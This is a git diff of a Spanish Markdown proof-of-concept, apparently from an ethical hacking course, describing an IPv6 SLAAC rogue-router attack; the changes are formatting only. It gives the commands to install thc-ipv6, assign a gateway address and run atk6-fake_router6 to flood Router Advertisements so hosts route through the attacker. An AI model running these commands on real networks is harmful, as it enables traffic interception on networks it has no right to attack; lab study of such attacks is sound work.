@@ -1,7 +1,9 @@
 # PoC: Ataque SLAAC (IPv6 Rogue Router)
 
 **Autor:** Pablo Arenas
-**Asignatura:** Hacking Ético / Seguridad en Redes
+
+**Asignatura:** Hacking Ético
+
 **Fecha:** Diciembre 2025
 
 ---
@@ -28,11 +30,11 @@ El ataque consiste en introducir un **"Rogue Router"** (Router falso) en la red 
 Primero, instalamos las herramientas necesarias en Kali Linux y nos asignamos una IP estática dentro del rango malicioso que vamos a inyectar (`2001:1234::/64`) para actuar como gateway.
 
 
-# 1. Instalación de la suite thc-ipv6
+#### 1. Instalación de la suite thc-ipv6
 ```bash
 sudo apt update && sudo apt install thc-ipv6
 ```
-# 2. Asignación manual de la IP del router falso
+#### 2. Asignación manual de la IP del router falso
 ```bash
 sudo ip -6 addr add 2001:1234::1/64 dev eth0
 ```
@@ -40,6 +42,7 @@ sudo ip -6 addr add 2001:1234::1/64 dev eth0
 ### Paso 2: Despliegue del Rogue Router
 Lanzamos el ataque de inundación de paquetes RA. Esto hace que todos los equipos de la red acepten nuestro prefijo `2001:1234::` y nos configuren como su router IPv6 por defecto.
 
-
-# Comando para iniciar el anuncio de router falso
+#### Comando para iniciar el anuncio de router falso
+```bash
 sudo atk6-fake_router6 eth0 2001:1234::/64
+```
